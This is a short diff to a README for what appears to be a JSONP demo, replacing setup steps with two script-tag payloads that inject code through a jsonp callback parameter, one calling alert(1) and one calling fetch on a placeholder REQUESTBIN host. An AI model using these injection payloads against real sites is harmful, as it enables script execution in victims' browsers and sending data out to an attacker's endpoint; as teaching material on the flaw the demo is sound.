@@ -1,4 +1,7 @@
 ### jsonp demo
+basic 
+<script src="http://HOSTNAME:PORT?jsonp=alert(1); //"></script>
 
-* before starting, edit `'127.0.0.1 jokes.com' >> /etc/hosts'`
-* launch both servers and navigate to localhost:7040
+&nbsp;
+ 
+<script src="http://HOSTNAME:PORT?jsonp=fetch('REQUESTBIN'); //"></script>
